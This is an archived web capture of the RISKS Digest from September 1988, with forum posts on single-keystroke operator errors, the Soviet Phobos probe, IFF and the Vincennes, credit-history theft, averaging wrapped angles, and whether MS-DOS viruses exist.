  doubt if the  general policy of the UK air  defence people has changed.
  It would appear  that the Captain of the Vincennes  worked to a similar
  set of assumptions.

  BTW,  The Nimrod  project was  done  by GEC-Marconi  Space and  Defence
  Systems. This is a part of the  same company that is currently being so
  unlucky with suicides and strange accidental deaths.

  Geoff. Lane.,  University of Manchester Regional Computer Centre

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"Single keystroke"
</A>
</H3>
<address>
"Philip E. Agre" 
&lt;<A HREF="mailto:AGRE@AI.AI.MIT.EDU">
AGRE@AI.AI.MIT.EDU
</A>&gt;
</address>
<i>
Mon, 12 Sep 88 03:50:09 EDT
</i><PRE>

PGN attaches the following comment onto a message about the Soviet's loss of
a Phobos spacecraft.

  [Several people reported on radio items that attributed the problem to a
  console operator's single keystroke in error, which it was speculated
  might have triggered the Mars probe's self-destruct signal.  After the
  command was sent, contact with the probe was lost completely.  PGN]

I have no reliable information about this particular case, but I am struck
by the high proportion of operator mistakes which get reported as `single
keystroke' errors.  I strongly suspect that single-keystroke errors are
largely an urban myth (you know, poodles in microwaves and the like).  I'm
sure that in this world of crummy user interfaces you can often do plenty of
damage with a single keystroke, but the image of a single mistaken keystroke
leading to disaster has got to be a very tempting trope for journalists and
cartoonists and rumor-passers whether it's accurate or not.  Besides, it'll
always have a certain tenuous relation to the truth: the single keystroke
that does the damage is the final Return you hit after your two hundred
keystrokes of wrongheadedness.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
`Credit doctors'
</A>
</H3>
<address>
Donn Seeley
&lt;<A HREF="mailto:donn@cs.utah.edu ">
donn@cs.utah.edu 
</A>&gt;
</address>
<i>
Mon, 12 Sep 88 00:46:26 MDT
</i><PRE>

Clean Credit for Sale: A growing illegal racket
by Larry Reibstein with Lisa Drew, Newsweek 9/12/88 p. 49

Houston schoolteacher Darlene Alexander thought she had a clean credit record.
Then in June she applied for a $75,000 mortgage, and the lender told her she
had too much debt to qualify.  Her records showed accounts for American
Express, MasterCard and Visa.  The biggest balance was a $22,800 loan for a
1988 Chevrolet Camaro.  All this baffled Alexander.  None of the accounts were
hers; she drives a paid-up 1983 Datsun.  Alexander was a victim of 'credit
doctors,' people who use computers to steal good credit histories and then sell
that information to people with bad credit.  Using Darlene Alexander's name and
history, an impostor opened charge accounts and got loans with almost no risk.
The real Alexander, who was also turned down for a vacation loan, is angry.
'You try for years to get good credit,' she says, 'and then someone else just
takes it away from you.'

Credit doctors -- thieves, really -- are starting to surface in a big way.  In
Houston, where the depressed economy has created plenty of willing customers,
about 30 people have been arrested, and 20 convicted, for credit-doctoring
schemes in the last year.  Among them were 'patients' -- consumers -- who paid
up to $2,000 for stolen or fake credit identities.  Houston police have
identified $7 million to $10 million in merchandise and homes bought with the
help of fraudulent accounts.  Similar cases have cropped up in Chicago and Los
Angeles.  In an era when everyone seems intent on building up their credit one
way or another, Secret Service agent Neal Findley says, 'An industry has risen
up based on getting into other people's credit files.'

The thieves work by tapping credit-bureau computers that contain histories on
millions of consumers.  It's surprisingly easy.  Credit doctors usually buy the
computer-access code from a contact who works in a legitimate business, such as
a mortgage company.  Using a personal computer, the credit doctor searches for
someone who has his client's name -- and good credit.  He then copies that
person's credit history -- including the all-important social security number
[[argh! -- Donn]] -- and furnishes the information to the client, who uses it
when applying for credit.  Houston police say some consumers have been offered
a choice of credit histories at a range of prices, depending on the 'quality'
of the stolen credit.  ...

Authorities believe many credit-doctoring scams remain undetected.  People
whose histories have been stolen may never know it -- until a lot of debt is
entered in their names.  Merchants often look the other way as long as the
impostor is keeping up with payments, says Houston police lieutenant J. F.
Rabago.  Many credit bureaus say that no safeguards can completely block
unauthorized access to their computers.  For now, a consumer can only hope that
someone with the same name isn't in the market for a new credit history.

[[Are credit bureaus' security measures really this lax?  It's not hard
to believe, just appalling.  -- Donn]]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Scientific Safety
</A>
</H3>
<address>
&lt;<A HREF="mailto:WHMurray@DOCKMASTER.ARPA">
WHMurray@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Sun, 11 Sep 88 13:22 EDT
</i><PRE>

Since I only speak American, I often have a difficult time understanding
things originating across the pond.  For esmaple, Bev Littlewood writes:

&gt;The system is certificated in Europe, the thing is carrying passengers,
&gt;yet, I believe, it cannot be asserted in any scientifcally meaningful
&gt;way that it has an "acceptable level of safety". 

It is not clear to me whether "scientifically meaningful" modifies
"can be asserted" or "acceptable level of safety."  It seems to me that
a great part of this discussion has turned on whether "acceptable level
of safety" can ever be a scientific term.

It sounds to me as though it is being asserted that in the UK it is a
scientific and, even legal, term.  I would assert that in the US it is neither.
It is at best political, and at worst journalistic.  The toleration of a risk
in the US is inversely proportional to its novelty or its mystery.

We do not tolerate the risk of the medicinal use of marijuana or heroin in
terminally ill patients.  On the other hand we tolerate 300,000 premature,
painful and slow deaths a year from the use of tobacco.  We tolerate 1500 to
10,000 measureable deaths a year from the burning of fossil fuels.  Much lower
risks of alternatives cannot be tolerated because of the absence of political
courage.  We kill 40,000 people a year on our highways, and maim for life
another 2-400,000, while programs in other countries suggest to us that least
half of those are avoidable.

Novel technology, such as fly-by-wire, would not be tolerated here unless it
could be "proved" to be safer than the technology in use.  (The opposition to
the A320 in the US revolves around the fact that it contributes to an
unfavorable balance of trade and has a two man cocpit.  The opposition has
missed a good bet.  The risk of new foods and drugs here are measured
absolutely, in terms of their risk in small animals; not against the risk of
the alternatives.  Better the devil we know.

One can say little "scientific" about safety and risk in such a society.

William Hugh Murray, Fellow, Information System Security, Ernst &amp; Whinney
2000 National City Center Cleveland, Ohio 44114                          
21 Locust Avenue, Suite 2D, New Canaan, Connecticut 06840                

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Bev Littlewood's message in <A HREF="/Risks/7.48.html">RISKS-7.48</A>
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Sun, 11 Sep 88 20:28:20 PDT
</i><PRE>

Somewhere between Bev's transmission to Brian Randell and Brian's
retransmission to me, Bev's lines longer than 80 characters got truncated.
Sorry.  [Probably at the border?  Customs?  Round up the usual characters?]
  [By the way, I sometimes get messages from within the U.S.A. whose text has 
  NO line breaks -- just rampant character strings.  The UK/USA 80-character
  filter would truncate the entire message except for the first 80 characters!]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Calculations with Wrapped Numbers
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Fri, 9 Sep 88 17:41:38 EDT
</i><PRE>

&gt; &gt; The problem occurs when the previous value is -175 or so and the new
&gt; &gt; value is +175.  What is the average?

&gt; A good way to estimate an average angle, A, from a set of angle measurements
&gt; a[i] 0&lt;=i&lt;N, is ....

The reason that this problem is a problem is that in modular arithmetic --
which is what we're talking about here -- there *is* no such thing as an
"average", at least not in the usual sense of "arithmetic mean".

It would probably help, then, if people would be careful to define their
terminology.

The "average" algorithm that the second-cited poster gave arises as follows.
Represent the modular arithmetic as a circle (the original physical
representation in this case); take each angle value as a vector, all of equal
length; sum (or average, doesn't matter) all the vectors; and translate the
direction (if any) of the resultant back into a numeric angle value.  I guess
this is indeed correct for problems where it makes sense to speak of an average
angle, but it may be useless for other problems involving "averaged" modular
numbers.

Mark Brader, SoftQuad Inc., Toronto	

</PRE>
<HR><H3><A NAME="subj8.2">
Calculations with wrapped numbers (Re: <A HREF="/Risks/7.44.html">RISKS-7.44</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:Bennet.Yee@PLAY.MACH.CS.CMU.EDU">
Bennet.Yee@PLAY.MACH.CS.CMU.EDU
</A>&gt;
</address>
<i>
Tue, 06 Sep 88 10:03:56 EDT
</i><PRE>

karsh@sgi.com suggests using trig

                       sum_i_from_1_to_N sin(a[i])
	a = arctangent ---------------------------
                       sum_i_from_1_to_N cos(a[i])

to average angles.  This forces us to perform consistency checks to figure
out which quadrant the angle is really in.  Otherwise, we may get incorrect
results (risk of using posted algorithms?).   Perhaps a simpler algorithm
would be to view the angle measurements as [unit] vectors and average the
vectors together.  Not only is this conceptually simple, it also allows
incorporation of measurement reliability by scaling the vectors.

    [Similar comment from Mark Mandel...]

</PRE>
<HR><H3><A NAME="subj8.3">
Re: Calculations with wrapped numbers
</A>
</H3>
<address>
&lt;<A HREF="mailto:wolit@research.att.com">
wolit@research.att.com
</A>&gt;
</address>
<i>
Tue, 6 Sep 88 16:28 EDT
</i><PRE>

You take the average of the sines of the angles and the average of the
cosines of the angles, divide, and take the arctangent of the result.

Jan Wolitzky, AT&amp;T Bell Labs, Murray Hill, NJ; 201 582-2998; mhuxd!wolit

</PRE>
<HR><H3><A NAME="subj8.4">
RE: Calculations with wrapped numbers and risks of roundoff
</A>
</H3>
<address>
Magister ludorum
&lt;<A HREF="mailto:goun%evetpu.DEC@decwrl.dec.com ">
goun%evetpu.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
6 Sep 88 15:24
</i><PRE>

&gt;&gt; Imagine trying to compute the average position of the second hand on a
&gt;&gt; clock.  You sample the position once a second for sixty seconds.  Ok, now
&gt;&gt; what is the average?

I made a deliberately naive attempt to determine the average position of a 
second hand, using the above formula and a spreadsheet program that shall 
remain nameless.  I assumed N = 60, 0 &lt;= a[i] &lt;= 354.  The spreadsheet 
dutifully reported that sum_i_from_1_to_N sin(a[i]) = -7.173E-10, 
sum_i_from_1_to_N cos(a[i]) = .000000014, and a = -3.0000006.

This example is obviously contrived to "make the computer look bad."  But it's
not hard to imagine a scenario in which such a completely bogus answer might
seem plausible to an unsophisticated consumer of information, especially if he
or she was not shown the intermediate results of the calculation.
                             					    Roger Goun

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.49.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.51.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-3</DOCNO>
<DOCOLDNO>IA012-000131-B034-90</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.51.html 128.240.150.127 19970217023040 text/html 21373
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:29:08 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 51</TITLE>
<LINK REL="Prev" HREF="/Risks/7.50.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.52.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.50.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.52.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 51</H1>
<H2> Tuesday 13 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Single Character Errors 
</A>
<DD>
<A HREF="#subj1.1">
Geoff. Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Soviet Mars Probe and single character errors 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Stanford Collider Shut Down 
</A>
<DD>
<A HREF="#subj3.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Destructive remote controls 
</A>
<DD>
<A HREF="#subj4.1">
Jim Williams
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: computer follies 
</A>
<DD>
<A HREF="#subj5.1">
Michael Greim via Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  IFF and the Vincennes 
</A>
<DD>
<A HREF="#subj6.1">
Dennis Brantly
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Disinterest in disaster not based on probability estimates 
</A>
<DD>
<A HREF="#subj7.1">
Amos Shapir
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  ``MS-DOS "virus" programs do not exist.'' 
</A>
<DD>
<A HREF="#subj8.1">
David Dyer-Bennet
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Hiding payoff slot 
</A>
<DD>
<A HREF="#subj9.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Citation for "car engines become target for hackers" 
</A>
<DD>
<A HREF="#subj10.1">
karl
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
   Single Character Errors
</A>
</H3>
<address>
"Geoff. Lane. Tel UK-061 275 6051" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 11:07:15 BST
</i><PRE>

It has been suggested in a previous RISKS that single keystroke errors may
just be an Urban Myth.  Unfortunately not - in the GEORGE 3 operating system
(which used to run on ICL 1900 series computers) the command to edit a file
was "ed" and the command to erase a file was "er".  The letters "d" and "r"
are conveniently next to each other on the keyboard.

Apart from this one aberration the George 3 system was a great improvement
on all its successors!

Geoff. Lane., University of Manchester Regional Computer Centre

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Soviet Mars Probe
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 15:20:18 PDT
</i><PRE>

For the "single-character" doubters:

The Soviet Mars probe was mistakenly ordered to "commit suicide" when ground
control beamed up a 20 to 30 page message in which a single character was
inadvertently omitted.  The change in progam was required because the Phobos
1 control had been transferred from a command center in the Crimea to a new
facility near Moscow.  "The [changes] would not have been required if the
controller had been working the computer in Crimea."  The commands caused
the spacecraft's solar panels to point the wrong way, which would prevent
the batteries from staying charged, ultimately causing the spacecraft to run
out of power.

[From the SF Chronicle, 10 Sept 88, item (page A11), thanks to Jack Goldberg.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Stanford Collider Shut Down
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 15:35:20 PDT
</i><PRE>

Stanford University's $115 million linear collider has been shut down after
several months' efforts failed to get it running properly.  Although there
seems to be nothing basically wrong with the system, it is "simply so
complicated that, despite the best efforts of more than 100 people, they have
not been able to keep all its complex parts working together long enough to get
results."  Since spring they have "fought a succession of glitches and
breakdowns in the machine's myriad magnets, computer controls, and focusing
devices."  [Source: San Francisco Chronicle, 13 September 1988, p. A2]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Destructive remote controls
</A>
</H3>
<address>
&lt;<A HREF="mailto:williams@CSS.NRL.NAVY.MIL">
williams@CSS.NRL.NAVY.MIL
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 13:26:56 EDT
</i><PRE>

Recently, I was in a hotel room in the Washington, DC area.  The TV in
the room had a remote control that was not, as is often done, anchored
to the bedside table, but did have this theft-deterant notice on it:

	"This remote control will only work on Beeblebrox Hotel TVs.
	REMOTE WILL DAMAGE your home TV sets."

The first sentence I believe, the second I absolutely do not.  I can not
imagine what form the damage might take, unless the IR coming from the
remote is so bright that it would burn out the sensor in an "ordinary"
TV or VCR.  So, is this notice a lie, to decrease the likelyhood of theft?
That's all I could figure, but it sure reduced my opinion of Beeblebrox
Hotel for putting such a silly notice on the thing.  

Why am I posting this to RISKS?  Well, suppose it's true!  What damage
could I do with this "infrared laser"?  Will it hurt my eyes?  If I had an
HP-28 calculator, or similar device, which uses an optical connection
for the printer, could I accidentally damage that?  Had I been an actual
paying guest I would have harassed them about it, but I was just visiting
and it was on a weekend, so I doubted I'd find out anything useful.

Technical information:  The remote (and TV) were made by General Electric, it
was powered by two AAA cells, and seemed to be a typical IR controller, but
with minimal functions.  "Beeblebrox" is not the true name of the hotel ;-).

Jim Williams

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: computer follies
</A>
</H3>
<address>
Mark Brader 
&lt;<A HREF="mailto:msb@sq.sq.com">
msb@sq.sq.com
</A>&gt;
</address>
<i>
Mon, 12 Sep 88 14:55:19 EDT
</i><PRE>

Path: sq!utfyzx!utgpu!utzoo!attcan!uunet!mcvax!unido!sbsvax!greim
From: greim@sbsvax.UUCP (Michael Greim)
Date: 7 Sep 88 09:29:05 GMT
Organization: Universitaet des Saarlandes, Saarbruecken, West Germany

Here are some computer follies published some time ago.

&gt;From Jack Campin (jack@cs.glasgow.ac.uk) on Nov 27 1987

&lt;I have had the doubtful privilege of looking after an ICL 3930 over the last
&lt;couple of years. This machine has a prodigious number of ways to reboot; most
&lt;of them are reasonably documented, but one - I think the one you use when you
&lt;want to save an image of a set of virtual machines to disk to speed up future
&lt;routine reloads - comes up with a prompt:
&lt;ENTER DATE AND TIME
&lt;and leaves you guessing. It only accepts ONE date format, and the manuals
&lt;nowhere say what it is. I first got the answer on Monday morning on the first
&lt;of January 1986 and it's this:
&lt;TUE.1986/01/07__08.32
&lt;Intuitive, eh? - I think it took about four phone calls before I found someone
&lt;at ICL who knew what it ought to be.

&gt;From  Tim Olson (tim@amdcad.UUCP) on Dec 1 1987

&lt;Back to the original discussion, here is an example Alan Kay gave in a
&lt;talk at Stanford about 2 years ago (paraphrased by me and my potentially
&lt;faulty memory!):
&lt;
&lt;To test out new user interfaces, Xerox would videotape novice users
&lt;working with the system.  In one particular instance, one person was to
&lt;perform a task that required a DoIt command at the end (from a pull-down
&lt;menu).  He kept repeating the cycle of performing everything up to the
&lt;DoIt, pulling down the menu, going to the DoIt entry in the menu,
&lt;muttering something under his breath, then quitting out of the menu.
&lt;
&lt;Upon review of the tape, the researchers discovered that the person was
&lt;muttering "DOLT!..  I'm not a dolt".  They then realized that DoIt (with
&lt;an uppercase I) *did* look like the word "dolt" in the sans-serif font
&lt;they had for the system.  They later changed it to "doit" (lowercase
&lt;'i'). 

&gt;From Clif Flynt (clif@.chinet.UUCP) 15 Dec 1987 :
&lt;In article &lt;1943@ncr-sd.SanDiego.NCR.COM&gt; matt@ncr-sd.SanDiego.NCR.COM (Matt Costello) writes:
&lt;&gt;The real problems in interface design generally occur because of
&lt;&gt;unstated assumptions.  We had a hilarious incident occur here
&lt;&gt;recently...
&lt;&gt;
&lt;&gt;  Imagine our suprise when a worried secretary called
&lt;&gt;to say that she had been able to fit only 5 of the disks into the
&lt;&gt;disk drive.  
&lt;&gt;
&lt;
&lt;  A similar incident happened to a friend, diagnosing a floppy disk read 
&lt;problem over the phone.  
&lt;  "Have you cleaned the disk?"  He inquired, thinking that the heads might
&lt;be dirty.
&lt;  "I'll try it and call you back", said the person at the other end, and
&lt;about 10 minutes later called back to inform my friend.  "I took the disk
&lt;out of that black wrapper, and you were right, it was covered with brown
&lt;dusty stuff.  I cleaned that all off, but it still doesn't work."
&lt;
&lt;
&lt;  There is also the tale of the DP manager who wanted to make sure that
&lt;nobody would overwrite the data on his tapes.  He filled the slots where
&lt;the write-enable rings would go with epoxy, so that no-one could put
&lt;a write enable ring in.  He didn't realize that ANYTHING in that slot will 
&lt;enable the tape for writing.
&lt;
&lt;  Another friend of mine tells the tale of a system where people 
&lt;could log in OK as long as they sat in front of the terminal.
&lt;If they stood in front, then their password was rejected.
&lt;  It finally turned out that two key-caps on the keyboard had been swapped.
&lt;When people sat, they put their fingers on the 'home row' and typed,
&lt;but standing, they typed with two fingers, and looked at the key-caps to 
&lt;see which keys to press.

Michael T. Greim, Universitaet des Saarlandes, FB 10 - Informatik (Dept. of CS)
Bau 36, Im Stadtwald 15 D-6600 Saarbruecken 11, West Germany
voice: +49 681 302 2434              

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
IFF and the Vincennes
</A>
</H3>
<address>
&lt;<A HREF="mailto:brantly.henr@Xerox.COM">
brantly.henr@Xerox.COM
</A>&gt;
</address>
<i>
13 Sep 88 10:11 EDT
</i><PRE>

In response to the Geoff. Lane msg of Mon, 12 Sep 88 09:32:13 BST; "IFF and the
Vincennes" in which he stated:

  "a) NO  combat fighter plane  will ever go  into combat with  its IFF system
  operating - for obvious reasons!"

I must disagree.  

My understanding is that there are 3 catagories in which a "bogy" will be
placed, depending on the IFF, or absence of IFF:

1&gt; Friend
2&gt; Foe
3&gt; Unknown

IF a ship finds itself in a COMBAT situation and detects an aircraft which is
approaching and which is not of catagory 1, then the ship will more than likely
fire.

The only way that an aircraft can be determined to be a FRIEND is either by
having correct IFF or by visual comfirmation.  An aircraft with NO IFF, will be
of catagory 3 (Unknown), but if considered approaching in a threatening manner
(ship's determination not the pilot) will quickly be changed by default to
catagory 2 (Foe) and will be fired upon.

You might ask what is to prevent an "enemy" aircraft from being classified as a
FRIEND?  Elaborate measures ARE in place to prevent this from happening,
HOPEFULLY they are adequate.  It is because it is easier to "turn the IFF off"
(becoming catagory 3 rather than 2) than break the codes necessary to become
catagory 1, that makes the Unknown aircraft so likely to be fired upon in a
combat situation.

So my argument is that if a friendly aircraft is operating in an area where
there are also friendly forces, it had best keep its IFF "ON" or "risk" that
it's own forces may shoot it down.  

In the "heat of battle" each individual ship must make fast decisions based on
the information it has available to it at that time (IFF).  Those decisions
ultimately determine the fate of the ship/crew/mission. 

Case in point:

  Vietnam, 1972

  I was the operator of MR3, Missile Radar #3 (AN/SPG 51-C) on the USS Towers
  (DDG-9) off the coast of Haiphong Harbor, North Vietnam, approx. 3AM.  We
  were in the process of shelling various railway yards and also taking fire
  from 175mm shore batteries when a low-flying, high-speed aircraft was
  detected heading towards our ship at approx. 12 miles distance, with no IFF.

  The plane was immediately assumed hostile, both MR2 &amp; MR3 were assigned the
  target.  MR3 "locked on" first.  2 "birds" (standard - missiles) were loaded
  on the launcher, and the launcher was assigned to MR3.  At that time the
  target was within only 1 - 2 seconds from being fired upon.

  It was a US F-4 phantom fighter.  He detected our "intent to launch" and
  QUICKLY turned on his IFF.  The launcher was unloaded (you don't want to
  leave live missiles on the rail when you're taking hostile fire from shore
  batteries!) and MR3 was then unassigned.

  IFF was the only thing that prevented us from firing at, and more than likely
  shooting down, one of our own aircraft.

I guess my point is that having your IFF "turned off" doesn't really buy you
anything, at least not in a "combat" situation.  Perhaps in a "sneak attack"
during peace time, when you would more than likely be given the benefit of the
doubt, but not once a conflict has started.  Anti-ship weapons (and their
launch platforms) have become too sophisticated, their warheads too powerful,
for a Captain to risk his ship &amp; crew on being wrong.
                                                              Dennis

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Disinterest in disaster not based on probability estimates
</A>
</H3>
<address>
Amos Shapir
&lt;<A HREF="mailto:amos@taux02.UUCP ">
amos@taux02.UUCP 
</A>&gt;
</address>
<i>
12 Sep 88 22:44:06 GMT
</i><PRE>

Clifford Johnson (<A HREF="/Risks/7.51.html">RISKS-7.51</A>) complained about the public's disinterest in
disasters vs.  their interest in the lottery, even though the former's odds of
occurring are much greater.

I'm afraid the public's view is understandable even from the statistical point
of view: the odds of winning the lottery are slim, but it does happen to
somebody somewhere every week; a nuclear disaster is rare, and so far each of
the few that did happen caused less casualties than a major airliner crash, and
all the victims were concentrated in a small area.  Anyone outside such an area
is safe.  It's this 'lumping' of consequences that distorts the calculation of
statistical odds.  

Amos Shapir, National Semiconductor (Israel) P.O.B. 3007, Herzlia 46104, Israel
Tel. +972 52 522261  TWX: 33691, fax: +972-52-558322

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
``MS-DOS "virus" programs do not exist.'' (Re: <A HREF="/Risks/7.49.html">RISKS-7.49</A>)
</A>
</H3>
<address>
David Dyer-Bennet
&lt;<A HREF="mailto:ddb%ns%bungia@umn-cs.cs.umn.edu ">
ddb%ns%bungia@umn-cs.cs.umn.edu 
</A>&gt;
</address>
<i>
12 Sep 88 22:35:54 GMT
</i><PRE>

In <A HREF="/Risks/7.49.html">RISKS-7.49</A>, Mark Moore writes about a public-domain software catalog
containing an article claiming that MS-DOS "virus" programs do not exist.  I
view this with a certain glee, because for several years I've been
attempting to follow up each story about viruses I hear; so far, the story
has either faded into the distance, or I have been told that they have the
virus isolated, but won't show it to me.  While I accept that people running
academic computer centers, in particular, have some justification for taking
a paranoid attitude (though I wasn't approaching them from within as a
student), I've been telling people for some time that by covering up viruses
the way they do, they are going to lead people to believe it's all a myth,
which in the long run is bad.  So let me just say, "I told you so." to those
who've been concealing the evidence.
               	                      -- David Dyer-Bennet, Terrabit Software

	...!{rutgers!dayton | amdahl!ems | uunet!rosevax}!umn-cs!ns!ddb
	ddb@Lynx.MN.Org, ...{amdahl,hpda}!bungia!viper!ddb
	Fidonet 1:282/341.0, (612) 721-8967 hst/2400/1200/300

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Hiding payoff slot (Re: <A HREF="/Risks/7.42.html">RISKS-7.42</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:ficc!peter@uunet.UU.NET">
ficc!peter@uunet.UU.NET
</A>&gt;
</address>
<i>
Tue, 13 Sep 88 11:47:06 EDT
</i><PRE>

 &gt; Modified games must have some sort of mechanism (either mechanical or human)
 &gt; to pay off a win.  ...                                           jim frost

The gambling mechanism already exists in most vending mchines these days,
and could be easily justified as part of a videogame. This mechanism is
a change slot. If the game gives change under computer control, it can
easily be modified to handle the payoff as well.

Also, many video-games these days have a 'challenge mode', where you can
send in for a tee-shirt if you beat a particularly hard level. Perhaps
this could be considered gambling?

Peter da Silva, Ferranti International Controls Corporation

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Citation for "car engines become target for hackers"
</A>
</H3>
<address>
&lt;<A HREF="mailto:karl%ficc@uunet.UU.NET">
karl%ficc@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed Sep  7 15:24:11 1988
</i><PRE>

Readers seeking more information about car engine computer hacking are directed
to the article "Electronics puts its foot on the gas" in the May 1988 issue of
"IEEE Spectrum."  The article profiles a couple of companies working in this
area.  While one company had reverse-engineered source code and was using
in-circuit emulators to debug their changes, another was merely substituting
values into an array they'd located.  The tone of the article was not as
